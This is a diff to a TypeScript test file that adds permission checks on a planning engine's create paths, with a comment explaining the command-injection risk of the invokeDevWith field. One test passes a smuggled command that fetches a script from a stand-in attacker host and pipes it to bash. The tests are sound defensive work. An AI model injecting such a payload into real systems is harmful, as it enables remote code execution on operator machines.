@@ -14,6 +14,7 @@ import {
   createEngine,
   DEFAULT_PROJECT_SLUG,
   GuardFailedError,
+  PermissionDeniedError,
   type Actor,
   type SpineEngine,
 } from '../src/index.js';
@@ -178,5 +179,97 @@ describe('project — work item queries filter by project', () => {
     expect(inA.map((i) => i.externalKey).sort()).toEqual(['pa-1', 'pa-2']);
     const inB = rig.engine.listWorkItems({ projectId: 'pb' }); // slug resolves here too
     expect(inB.map((i) => i.externalKey)).toEqual(['pb-1']);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// 0.2b — the planning surface is permissioned.
+//
+// This cluster OVERRIDES an earlier pin (CONFORMANCE.md: "`createProject` carries
+// no engine-side permission check — deliberately symmetric with `createFeature`
+// (whose `feature.init` convention is enforced at the ops layer, not pinned in the
+// engine)"). The reason the pin falls is that its premise is false: nothing at any
+// layer enforced it. `apps/spine-api/src/bus.ts` passes `ctx.actorId` straight into
+// `createFeature` / `createWorkItem` / `importStories` / `project_create` with no
+// `requirePermission` and no `requireAdmin`, so "the ops layer" was a convention
+// nobody implemented.
+//
+// It matters more than an ordinary missing check because `createWorkItem` is the
+// WRITE PATH for `invokeDevWith`, which the runner interpolates into the agent
+// command it executes. An unpermissioned create is therefore an unpermissioned
+// write into a string that runs on an operator machine — the inverse of D13, where
+// the process that decides what runs must never be the unprivileged one.
+//
+// `task.plan` is the permission, not a new one: it already governs the adjacent
+// `backlog→draft` transition, so "who may put work into the system" and "who may
+// start moving it" stay the same authority. `feature.init` governs the feature and
+// project containers, which is what the role bundles already assumed.
+// ---------------------------------------------------------------------------
+describe('the planning surface is permissioned (0.2b)', () => {
+  function outsiderRig(): { engine: SpineEngine; planner: Actor; outsider: Actor } {
+    const rig = makeRig();
+    const outsider = rig.engine.createActor({ type: 'agent', displayName: 'Zero-grant agent' });
+    return { ...rig, outsider };
+  }
+
+  it('denies createProject and createFeature without feature.init', () => {
+    const rig = outsiderRig();
+    expect(() => rig.engine.createProject({ actorId: rig.outsider.id, name: 'Squatted' })).toThrow(
+      PermissionDeniedError,
+    );
+    expect(() => rig.engine.createFeature({ actorId: rig.outsider.id })).toThrow(PermissionDeniedError);
+    // Nothing was created — a denied attempt mutates nothing (Phase 1 pin).
+    expect(rig.engine.listProjects().some((p) => p.name === 'Squatted')).toBe(false);
+  });
+
+  it('denies createWorkItem without task.plan — the invokeDevWith write path', () => {
+    const rig = outsiderRig();
+    const feature = rig.engine.createFeature({ actorId: rig.planner.id });
+    expect(() =>
+      rig.engine.createWorkItem({
+        featureId: feature.id,
+        externalKey: 'injected-1',
+        title: 'Looks ordinary',
+        actorId: rig.outsider.id,
+        // The payload that made this a code-execution path rather than a data one.
+        invokeDevWith: '" ; curl http://attacker/x | bash ; "',
+      }),
+    ).toThrow(PermissionDeniedError);
+    expect(rig.engine.listWorkItems({}).some((i) => i.externalKey === 'injected-1')).toBe(false);
+  });
+
+  it('denies importStories without task.plan — the same write path, in bulk', () => {
+    const rig = outsiderRig();
+    const feature = rig.engine.createFeature({ actorId: rig.planner.id });
+    expect(() =>
+      rig.engine.importStories({
+        featureId: feature.id,
+        yaml: '- id: "bulk-1"\n  title: Bulk\n  description: via import\n',
+        actorId: rig.outsider.id,
+      }),
+    ).toThrow(PermissionDeniedError);
+    expect(rig.engine.listWorkItems({}).some((i) => i.externalKey === 'bulk-1')).toBe(false);
+  });
+
+  it('a granted actor still does all four — the check adds authority, not friction', () => {
+    const rig = outsiderRig();
+    const project = rig.engine.createProject({ actorId: rig.planner.id, name: 'Permitted' });
+    const feature = rig.engine.createFeature({ actorId: rig.planner.id, projectId: project.id });
+    rig.engine.createWorkItem({
+      featureId: feature.id,
+      externalKey: 'ok-1',
+      title: 'ok one',
+      actorId: rig.planner.id,
+    });
+    const imported = rig.engine.importStories({
+      featureId: feature.id,
+      yaml: '- id: "ok-2"\n  title: ok two\n  description: fine\n',
+      actorId: rig.planner.id,
+    });
+    expect(imported.imported).toEqual(['ok-2']);
+    expect(rig.engine.listWorkItems({ projectId: project.id }).map((i) => i.externalKey).sort()).toEqual([
+      'ok-1',
+      'ok-2',
+    ]);
   });
 });
